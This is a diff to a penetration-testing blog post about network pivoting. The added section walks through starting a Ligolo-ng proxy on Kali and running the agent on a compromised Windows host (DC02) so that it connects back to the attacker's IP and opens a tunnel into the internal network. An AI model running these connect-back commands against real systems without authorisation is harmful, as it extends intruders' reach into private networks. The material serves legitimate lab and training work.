@@ -27,7 +27,7 @@ We are picking up from where Part 1 left off, with an established SSHuttle sessi
 
 <img src="/images/posts/pivoting/Pivoting_Part2_Initial.PNG" alt="pivoting-part2-initial" width="700"/>
 
-<h3>Ligolo Proxyr</h3>
+<h3>Ligolo Proxy</h3>
 
 First, you will need Ligolo-ng. Head to the GitHub, and download Ligolo from Releases for the architecrture of the victim, and for your Kali. I will assume that the victim is Windows. [Here is the GitHub for Chisel.](https://github.com/nicocha30/ligolo-ng)
 
@@ -50,3 +50,32 @@ At this point, we are now ready to spawn our proxy. We can launch our proxy with
 {% highlight bash linenos %}
 ./proxy -selfcert
 {% endhighlight %}
+
+With the proxy running, we should see the following:
+
+<img src="/images/posts/pivoting/ligolo-proxy-start.PNG" alt="pivoting-ligolo-proxy" width="400"/>
+
+<h3>Ligolo Agent</h3>
+
+Once we have our proxy listening on our Kali machine, we can run our ligolo-ng agent's to connect back to our Kali machine. To do this, transfer the agent to DC02. If you are unsure how to complete this, there are ways I covered in Part 2, using python's http.server and impacket-smbserver. Once the agent is on the victim, we can run the agent to connect:
+
+{% highlight bash linenos %}
+./agent.exe -connect 10.10.15.100:11601 -ignore-cert
+{% endhighlight %}
+
+In the above command, we run the agent to connect back to our Kali machine on port 11601, which ligolo uses by default. Because our proxy used the -selfcert flag, we must use the -ignore-cert flag. We should sewe the following from our victim:
+
+<img src="/images/posts/pivoting/ligolo-agent-start.PNG" alt="pivoting-ligolo-agent-run" width="400"/>
+
+Once the command has run, looking at our server, we should see Agent joined:
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent1-joined.PNG" alt="pivoting-ligolo-agent-joinedl" width="400"/>
+
+After the agent has joined, we can type 'session', and using the Enter key, select our session:
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent1-session.PNG" alt="pivoting-ligolo-session" width="400"/>
+
+Once selected, we can start our proxy by typing 'start':
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent1-start.PNG" alt="pivoting-ligolo-start" width="400"/>
+
